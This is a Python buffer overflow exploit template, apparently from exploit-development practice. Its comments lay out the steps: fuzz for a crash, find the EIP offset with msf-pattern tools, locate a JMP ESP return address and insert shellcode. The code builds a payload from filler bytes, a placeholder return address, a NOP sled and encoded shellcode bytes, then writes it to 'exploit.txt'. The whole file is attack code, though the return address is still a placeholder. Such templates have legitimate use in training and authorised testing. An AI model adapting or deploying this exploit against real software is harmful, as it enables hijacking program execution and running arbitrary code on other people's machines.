#!/usr/bin/python3

###############################
# Use filler to fuzz for the crash condition
# Once the crash is reproducible, use msf-pattern_create and msf-pattern_offset to find the correct EIP offset
# Adjust filler to the offset and check for EIP control with garbage payload and garbage filler2 for shellcode placeholder
# Find return address for EIP (such as JMP ESP instruction)
# Update shellcode with appropriate payload
# Adjust payload variable as needed for required output
###############################

filler = b"A" * 1000
#first_stage = b"\x83\xc5\x08\xff\xe5\x90\x90\x90"

#eip = b"\x5e\x51\x9a\x5e"#   5e9a515e"
eip = b"C" * 4

filler2 = b"B" * 700

nops = b"\x90" * 20

shellcode =  b""
shellcode += b"\x2b\xc9\x83\xe9\xef\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x0e\xeb\x38\x82\x83\xee\xfc"
shellcode += b"\xe2\xf4\x3f\x30\xcf\x61\x5d\xa8\x6b\xe8\x0c"
shellcode += b"\x62\xd9\x32\x68\x26\xb8\x11\x57\x5b\x07\x4f"
shellcode += b"\x8e\xa2\x41\x7b\x66\x2b\x90\xf5\xa3\x83\x3a"
shellcode += b"\x82\x0b\xd2\xb1\x63\xbe\x8d\x68\xd3\x5d\x58"
shellcode += b"\x3b\x0b\xef\x26\xb8\xd0\x66\x85\x17\xf1\x66"
shellcode += b"\x83\x17\xad\x6c\x82\xb1\x61\x5c\xb8\xb1\x63"
shellcode += b"\xbe\xe0\xf5\x02"

payload = filler + eip + nops + shellcode 

f = open("exploit.txt", "wb")
f.write(payload)
f.close()

print("\nDone!")
    
